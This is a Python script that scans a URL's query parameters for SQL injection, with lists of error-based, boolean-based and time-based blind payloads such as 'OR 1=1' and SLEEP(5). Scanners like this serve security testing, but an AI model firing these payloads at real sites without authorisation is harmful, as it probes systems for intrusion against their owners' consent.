import time
import requests
from concurrent.futures import ThreadPoolExecutor

SQLI_PAYLOADS = [
    "' OR '1'='1", "' OR 1=1 --", "' OR 1=1 #",
    "' OR 'a'='a", "' UNION SELECT null, null, null --"
]

BLIND_SQLI_PAYLOADS = [
    "'; WAITFOR DELAY '00:00:05' --",
    "' OR SLEEP(5) --",
    "' AND IF(1=1, SLEEP(5), 0) --",
]

SQL_ERROR_MESSAGES = [
    "SQL syntax", "mysql_fetch_array()", "You have an error in your SQL syntax",
    "Warning: mysql", "Microsoft OLE DB Provider for ODBC Drivers",
    "Unclosed quotation mark after the character string",
]

def test_sql_injection(url):
    print("\n[🔍] Testing for SQL Injection...")

    sql_injection_found = False
    boolean_sqli_found = False
    blind_sqli_found = False

    if "?" not in url:
        print("[-] No parameters detected in URL. Skipping SQLi test.")
        return

    base_url, param_string = url.split("?", 1)
    params = param_string.split("&")

    def scan_parameter(param):
        nonlocal sql_injection_found, boolean_sqli_found, blind_sqli_found
        key, value = param.split("=")

        for payload in SQLI_PAYLOADS:
            test_url = f"{base_url}?{key}={payload}"
            response = requests.get(test_url)
            if any(error in response.text for error in SQL_ERROR_MESSAGES):
                print(f"[⚠] SQL Injection Found! Parameter: {key}")
                sql_injection_found = True
                return

        true_url = f"{base_url}?{key}=1 AND 1=1"
        false_url = f"{base_url}?{key}=1 AND 1=2"
        if requests.get(true_url).text != requests.get(false_url).text:
            print(f"[⚠] Boolean-Based SQL Injection Detected! Parameter: {key}")
            boolean_sqli_found = True
            return

        for blind_payload in BLIND_SQLI_PAYLOADS:
            test_url = f"{base_url}?{key}={blind_payload}"
            start = time.time()
            requests.get(test_url)
            if time.time() - start > 4:
                print(f"[⚠] Possible Blind SQL Injection! Parameter: {key}")
                blind_sqli_found = True
                return

    with ThreadPoolExecutor(max_workers=5) as executor:
        executor.map(scan_parameter, params)

    if sql_injection_found:
        print("\n[⚠] Error-Based SQL Injection Detected!")
    if boolean_sqli_found:
        print("\n[⚠] Boolean-Based SQL Injection Detected!")
    if blind_sqli_found:
        print("\n[⚠] Possible Blind SQL Injection Detected!")
    if not (sql_injection_found or boolean_sqli_found or blind_sqli_found):
        print("\n[✓] No SQL Injection vulnerabilities detected.")
